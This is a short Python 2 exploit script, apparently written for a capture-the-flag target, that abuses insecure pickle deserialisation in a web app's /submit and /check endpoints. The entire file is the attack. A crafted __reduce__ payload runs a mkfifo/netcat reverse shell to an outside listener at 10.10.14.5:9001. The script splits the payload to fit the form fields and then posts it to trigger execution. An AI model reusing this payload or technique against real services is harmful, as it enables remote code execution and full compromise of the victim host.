import os
import pickle
import cPickle
from hashlib import md5
import requests

class RandomName(object):
	def __reduce__(self):
		return (os.system, ('echo homer!;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 9001 >/tmp/f',))

sc = cPickle.dumps(RandomName())
print sc

char, quote = sc.split("!")
p_id = md5(char + quote).hexdigest()

requests.post("http://10.10.10.70/submit", data={'character': char, 'quote': quote})

requests.post("http://10.10.10.70/check", data={'id': p_id})

